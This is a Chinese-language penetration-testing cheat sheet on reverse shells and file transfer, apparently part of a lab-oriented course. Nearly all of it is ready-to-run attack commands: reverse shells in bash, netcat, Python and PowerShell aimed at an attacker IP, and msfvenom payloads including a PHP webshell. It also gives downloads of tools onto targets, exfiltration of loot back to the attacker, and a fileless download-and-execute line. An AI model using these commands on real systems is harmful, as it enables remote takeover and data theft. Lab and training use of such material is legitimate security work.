# 速查：反彈 Shell 與檔案傳輸

> 原理看 [Ch 19](../19-reverse-shells.md)。線上產生器：revshells.com

## 監聽（Kali）

```bash
nc -lvnp 443
rlwrap nc -lvnp 443            # rlwrap 給你方向鍵/歷史
```

## 反彈 shell（Linux 目標）

```bash
bash -i >& /dev/tcp/10.10.14.5/443 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
# 無 /dev/tcp 時
mkfifo /tmp/f;nc 10.10.14.5 443 </tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## 反彈 shell（Windows 目標）

```powershell
# PowerShell one-liner（revshells.com 的 #3 常用）
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()}"
# 或上傳 nc.exe
nc.exe 10.10.14.5 443 -e cmd.exe
```

## msfvenom payload

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o shell
# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe
# PHP webshell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=443 -f raw -o shell.php
# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o shell.aspx
```

## 升級 TTY（Linux）

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
# Enter Enter
export TERM=xterm; export SHELL=/bin/bash
stty rows 50 cols 200
```

## 檔案傳輸 → 目標

```bash
# Kali 架站
python3 -m http.server 80
# Linux 目標下載
wget http://10.10.14.5/linpeas.sh -O /tmp/l.sh
curl http://10.10.14.5/l.sh -o /tmp/l.sh
# Windows 目標下載
certutil -urlcache -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe
powershell -c "iwr http://10.10.14.5/x.exe -o C:\Windows\Temp\x.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/x.exe','C:\Windows\Temp\x.exe')"
```

## 檔案傳輸 → 回 Kali

```bash
# Kali 收
nc -lvnp 9001 > loot.zip           # 目標：nc 10.10.14.5 9001 < file
# SMB（Windows 目標最順）
impacket-smbserver share . -smb2support       # 目標：copy file \\10.10.14.5\share\
# Windows 內建
powershell -c "(New-Object Net.WebClient).UploadFile('http://10.10.14.5/up','file')"
```

## Fileless（避免落地）

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerUp.ps1')
```

## 鐵律
- 優先用 443/80（防火牆常放行）
- 拿到 shell 立刻升 TTY，否則很多操作會斷
- Windows 傳檔首選 SMB server + copy
